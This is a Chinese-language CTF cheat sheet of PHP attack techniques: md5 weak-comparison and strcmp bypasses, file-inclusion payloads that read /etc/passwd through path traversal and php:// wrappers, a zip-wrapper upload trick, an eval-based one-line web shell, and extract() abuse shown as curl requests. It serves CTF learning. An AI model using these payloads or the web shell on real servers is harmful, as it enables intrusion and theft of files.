# PHP 题目相关

## PHP语言介绍

PHP是世界上最好的语言，这是在2010年前适用的一句话。

```php
1a == 1，! is_numeric(1a)

$$args，变量泄漏 _REQUEST\_SERVER\GLOBALS
```



## PHP RCE

如果有执行 php 代码的入口，通常需要掌握哪些函数能够获取文件内容或更多内部信息，同时要掌握绕过 安全狗 / WAF 的技巧。

常用的命令
```php
system('ls');
//下面几个原生的php函数，用来绕过对cat、more等linux命令的过滤
file_get_contents('filename');
highlight_file('filename');
readfile('filename');
```


## PHP 弱类型比较

* 弱类型比较 

  一般是要求字符内容不同，但是md5码相同

  ```php
  $v1 != $v2 && md5($v1) == md5($v2)
  ```

  有两种绕过思路，一种是**数组绕过**。PHP 5.x/7.x 中，md5() 接收到数组时会返回 NULL，NULL == NULL 在弱类型比较下相等。一种是**0e魔数绕过** 。存在特定的字符串，其MD5值以`0e`开头且后续全部是数字。PHP在弱类型比较时会将 `0e` 解析为科学记数法，其结果恒为0。

  ```php
  md5弱类型比较
  # 这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等
  QNKCDZO
  240610708
```

* strcmp 绕过

  ```php
  strcmp($v3, $flag)
```

  strcmp 传入非字符串类型（如数组）时，PHP 会返回 NULL，并抛出 WARNING，`!NULL` 为 true，这样就可以绕过检查。

  ```sh
  curl http://xxx/?v3[]=test
  ```

## 文件包含

PHP中的文件包含，一般是通过 `include` 或者 `require` 函数触发。可以利用 `/etc/passwd` 和 `../../../etc/passwd` 等进行探测。

* 最简单的就是直接包含文件，没做任何校验，直接 `/etc/passwd` 
* 尝试 php 伪协议绕过，`?file=php://filter/convert.base64-encode/resource=/etc/passwd` 或者 `php://input` 或者 `data://` 等协议
* 路经过滤绕过，`?file=../../../../etc/passwd` 或者 `?file=....//etc/passwd`
* `file` 协议 `?file=file:///flag.txt`，还可以写 `file://127.0.0.1/flag.txt` 以及利用地址短写 `file://127.1/flag/txt` 绕过检查
* `dict` 协议 `?file=dict://xxxx`
* `gopher` 协议 `?file=gopher://xxxx`

文件包含检查的绕过。

## 文件上传

通过 zip 伪协议方式访问 zip 包中的代码

```shell
$ http://103.213.97.75:53587/?file=zip:///var/www/html/upload/a.jpg%23shell.php
```

常用的一句话木马
```php
<?php
eval($_POST['cmd']);
?>
```

## file_get_contents

```php
extract($_GET);
if (!empty($ac)){
  $f = trim(file_get_contents($fn));
  if ($ac === $f){
  	echo $flag;
}
```

`extract($_GET)` 函数可以将GET请求的参数转化为对应的变量，可以利用 `data` 伪协议实现两个变量内容相等。

```sh
$ curl http://103.236.73.121:15085/?ac=hello&fn=data://text/plain,hello
```